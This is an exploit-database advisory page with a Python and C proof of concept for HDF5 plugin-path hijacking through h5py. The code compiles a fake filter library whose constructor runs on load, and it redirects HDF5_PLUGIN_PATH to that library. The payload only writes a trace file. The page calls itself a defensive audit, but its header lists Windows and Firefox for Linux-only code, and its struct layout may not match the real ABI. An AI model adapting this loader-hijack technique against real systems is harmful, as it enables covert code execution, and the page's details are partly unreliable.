---
title: HDF5 Plugin 2.17.0 Path Audit – ABI-Compliant Constructor Execution Test
url: https://cxsecurity.com/issue/WLB-2026020030
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-26
fetch_date: 2026-02-27T04:07:01.225589
---

# HDF5 Plugin 2.17.0 Path Audit – ABI-Compliant Constructor Execution Test

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **HDF5 Plugin 2.17.0 Path Audit – ABI-Compliant Constructor Execution Test** **2026.02.26**  Credit:  **[indoushka](https://cxsecurity.com/author/indoushka/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

=============================================================================================================================================
| # Title : HDF5 Plugin 2.17.0 Path Audit – ABI-Compliant Constructor Execution Test |
| # Author : indoushka |
| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.4 (64 bits) |
| # Vendor : https://pypi.org/project/hdf5plugin |
=============================================================================================================================================
[+] Summary : This script demonstrates a controlled security audit scenario targeting the HDF5 dynamic plugin loading mechanism.
It compiles a shared C library that mimics a legitimate HDF5 filter plugin by implementing the required H5Z\_class2\_t structure and registration functions (H5PLget\_plugin\_type, H5PLget\_plugin\_info).
The compiled library contains a constructor function that executes automatically when the library is loaded.
It performs a minimal validation action (writing a trace file) unless the AT\_SECURE flag is set, which indicates a hardened runtime environment where environment variables are sanitized.
[+] The Python wrapper script:
Compiles the shared object (libh5plugin.so).
Sets the HDF5\_PLUGIN\_PATH environment variable to manipulate plugin discovery.
Triggers HDF5 loading via h5py to test whether the custom plugin is loaded.
Determines whether the environment is misconfigured (unauthorized plugin execution) or properly protected (ABI mismatch, secure execution mode, or patched loader behavior).
The overall purpose is defensive validation: verifying whether an HDF5-enabled environment properly restricts dynamic plugin loading and resists environment-based library hijacking.
[+] POC :
import os
import subprocess
c\_code = """
#define \_GNU\_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/auxv.h>
typedef struct {
int version;
int id;
unsigned int flags;
const char \*name;
void \*can\_apply;
void \*set\_local;
void \*filter;
} H5Z\_class2\_t;
static const H5Z\_class2\_t hdf5\_audit\_filter = {
1,
256,
1,
"audit\_plugin",
NULL, NULL, NULL
};
int H5PLget\_plugin\_type() { return 1; }
const void\* H5PLget\_plugin\_info() { return &hdf5\_audit\_filter; }
\_\_attribute\_\_((constructor))
void audit\_init() {
if (getauxval(AT\_SECURE)) return;
FILE \*f = fopen("/tmp/.hdf5\_security\_check", "w");
if (f) {
fprintf(f, "Validation: ABI Match & Constructor Execution (PID: %d)\\n", getpid());
fclose(f);
}
}
"""
def run\_audit():
print("[-] Stage 1: Compiling ABI-compliant library...")
with open("exploit.c", "w") as f: f.write(c\_code)
subprocess.run(["gcc", "-shared", "-fPIC", "-o", "libh5plugin.so", "exploit.c"])
print("[-] Stage 2: Attempting environment manipulation...")
os.environ['HDF5\_PLUGIN\_PATH'] = os.getcwd()
print("[-] Stage 3: Triggering HDF5 Loader (Targeting h5py/TensorFlow)...")
try:
import h5py
with h5py.File('test\_audit.h5', 'w') as f: pass
except Exception as e:
print(f"[!] Runtime Mitigation: {e}")
if os.path.exists("/tmp/.hdf5\_security\_check"):
print("\\n[!] WARNING: Hijack Successful. The environment is MISCONFIGURED.")
else:
print("\\n[V] PROTECTED: No unauthorized library loading detected.")
print(" Analysis: ABI mismatch, AT\_SECURE cleaning, or TensorFlow patch is active.")
if \_\_name\_\_ == "\_\_main\_\_":
run\_audit()
Greetings to :==============================================================================
jericho \* Larry W. Cashdollar \* r00t \* Yougharta Ghenai \* Malvuln (John Page aka hyp3rlinx)|
============================================================================================

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020030)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top